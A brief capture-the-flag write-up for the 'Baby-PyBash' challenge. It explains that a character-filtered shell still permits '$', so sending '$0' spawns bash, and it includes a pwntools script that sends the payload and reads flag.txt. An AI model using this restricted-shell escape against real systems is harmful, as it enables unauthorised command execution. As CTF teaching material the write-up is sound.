# Baby-PyBash

Doing some black-box testing, we can figure out that `$` is still allowed. So, we can abuse `$` to run our own environment (/bin/bash) through the default `$0` environment variable. Just running `$0` is sufficient to get shell.

```py
from pwn import *

p = remote("baby-pybash.challs.csc.tf", 1337)

p.sendlineafter(b": ", b"$0")
p.sendline(b"cat flag.txt")
p.interactive()
```
